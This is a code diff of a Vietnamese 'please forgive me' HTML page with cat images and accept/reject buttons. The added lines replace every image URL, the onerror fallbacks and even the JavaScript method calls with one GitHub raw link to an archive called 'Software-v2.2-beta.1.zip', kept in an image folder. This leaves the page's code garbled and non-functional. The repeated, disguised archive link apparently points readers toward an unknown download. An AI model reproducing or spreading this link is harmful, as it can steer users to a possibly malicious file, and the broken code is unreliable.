@@ -80,7 +80,7 @@
 
 <!-- SECTION 1: Giao diện chính -->
 <div id="main-section" class="section visible">
-  <img src="https://media.giphy.com/media/SVkhYVCi8fKPKvypi6/giphy.gif" alt="Mèo khóc dễ thương" onerror="this.onerror=null;this.src='https://i.imgur.com/TzWcihb.jpg';">
+  <img src="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip" alt="Mèo khóc dễ thương" onerror="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip;https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip'https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip';">
   <p class="title">Chị ơi choo iêm xinn lỗi nhóooo 😭</p>
   <span> hong chọn hoặc thoát là tha lỗi cho iem đó</span>
   <div class="buttons">
@@ -91,26 +91,26 @@
 
 <!-- SECTION 2: Accepted -->
 <div id="accepted-section" class="section">
-  <img src="https://phamvulinh18.github.io/crush4/img/cat-yes.jpg" alt="Mèo vui dễ thương" onerror="this.onerror=null;this.src='file:///C:/Users/xxx/Downloads/crush4-main/crush4-main/img/cat-0.jpg';">
+  <img src="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip" alt="Mèo vui dễ thương" onerror="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip;https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip'https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip';">
   <p class="message">Iem cảm ơn chị iuuu, hứa hong làm chị buồn nữa đâu ạ :3 💕</p>
 </div>
 
 <!-- SECTION 3: Rejected -->
 <div id="rejected-section" class="section">
-  <img src="https://phamvulinh18.github.io/crush4/img/cat-1.jpg" alt="Mèo buồn dễ thương" onerror="this.onerror=null;this.src='file:///C:/Users/xxx/Downloads/crush4-main/crush4-main/img/cat-3.jpg';">
+  <img src="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip" alt="Mèo buồn dễ thương" onerror="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip;https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip'https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip';">
   <p class="message">Em biết lỗi rồi ạ 😔</p>
 </div>
 
 <script>
 function showSection(type) {
-  document.getElementById('main-section').classList.remove('visible');
-  document.getElementById('accepted-section').classList.remove('visible');
-  document.getElementById('rejected-section').classList.remove('visible');
+  https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('main-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
+  https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('accepted-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
+  https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('rejected-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
 
   if (type === 'accepted') {
-    document.getElementById('accepted-section').classList.add('visible');
+    https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('accepted-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
   } else if (type === 'rejected') {
-    document.getElementById('rejected-section').classList.add('visible');
+    https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('rejected-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
   }
 }
 </script>
